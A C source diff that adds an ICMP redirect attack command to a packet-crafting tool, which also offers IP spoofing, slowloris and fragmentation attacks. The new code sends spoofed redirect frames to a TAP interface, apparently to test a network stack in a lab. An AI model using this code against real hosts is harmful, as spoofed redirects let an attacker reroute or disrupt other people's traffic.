@@ -17,6 +17,7 @@ static void usage(void) {
     fprintf(stderr, "  ip-spoof   --src <ip> --dst <ip> --port <port> [--count <n>] [--iface <name>]\n");
     fprintf(stderr, "  slowloris  --target <ip> --port <port> [--conns <n>] [--iface <name>]\n");
     fprintf(stderr, "  frag-attack --target <ip> [--overlap] [--tiny] [--iface <name>] [--count <n>]\n");
+    fprintf(stderr, "  icmp-redirect --target <ip> --new-gw <ip> --orig-dst <ip> [--count <n>] [--iface <name>]\n");
     fprintf(stderr, "\nAll commands require sudo (raw socket access).\n");
 }
 
@@ -445,6 +446,56 @@ static int cmd_frag_attack(int argc, char **argv) {
     return 0;
 }
 
+static int cmd_icmp_redirect(int argc, char **argv) {
+    const char *target_str = NULL, *gw_str = NULL, *dst_str = NULL;
+    const char *iface = "iron0";
+    int count = 5;
+
+    for (int i = 0; i < argc; i++) {
+        if (strcmp(argv[i], "--target") == 0 && i + 1 < argc) target_str = argv[++i];
+        else if (strcmp(argv[i], "--new-gw") == 0 && i + 1 < argc) gw_str = argv[++i];
+        else if (strcmp(argv[i], "--orig-dst") == 0 && i + 1 < argc) dst_str = argv[++i];
+        else if (strcmp(argv[i], "--count") == 0 && i + 1 < argc) count = atoi(argv[++i]);
+        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
+    }
+
+    if (!target_str || !gw_str || !dst_str) {
+        fprintf(stderr, "Error: --target, --new-gw and --orig-dst required\n"); return 1;
+    }
+
+    uint32_t target_ip = parse_ip(target_str);
+    uint32_t new_gw    = parse_ip(gw_str);
+    uint32_t orig_dst  = parse_ip(dst_str);
+    if (!target_ip || !new_gw || !orig_dst) { fprintf(stderr, "Invalid IP\n"); return 1; }
+
+    int fd = tap_open(iface);
+    if (fd < 0) { fprintf(stderr, "Error: cannot open '%s'\n", iface); return 1; }
+
+    printf("=== ICMP Redirect Attack ===\n");
+    printf("  Target:   %s\n", target_str);
+    printf("  New GW:   %s\n", gw_str);
+    printf("  Orig dst: %s\n", dst_str);
+    printf("  Count:    %d\n\n", count);
+
+    uint8_t src_mac[6] = {0x02, 0xAA, 0xBB, 0xCC, 0x00, 0x07};
+    uint8_t dst_mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
+    uint8_t frame[128];
+    int sent = 0;
+
+    for (int i = 0; i < count; i++) {
+        int len = craft_icmp_redirect(frame, sizeof(frame),
+                                      src_mac, dst_mac,
+                                      src_mac[0] ? htonl(0xC0A80A01) : 0, /* fake src */
+                                      target_ip, new_gw, orig_dst);
+        if (len > 0) { tap_write(fd, frame, len); sent++; }
+        usleep(200000);
+    }
+
+    printf("  Sent: %d ICMP redirect messages\n\n", sent);
+    close(fd);
+    return 0;
+}
+
 int main(int argc, char **argv) {
     if (argc < 2) {
         usage();
@@ -467,6 +518,8 @@ int main(int argc, char **argv) {
         return cmd_slowloris(argc - 2, argv + 2);
     } else if (strcmp(cmd, "frag-attack") == 0) {
         return cmd_frag_attack(argc - 2, argv + 2);
+    } else if (strcmp(cmd, "icmp-redirect") == 0) {
+        return cmd_icmp_redirect(argc - 2, argv + 2);
     } else if (strcmp(cmd, "--help") == 0 || strcmp(cmd, "-h") == 0) {
         usage();
         return 0;
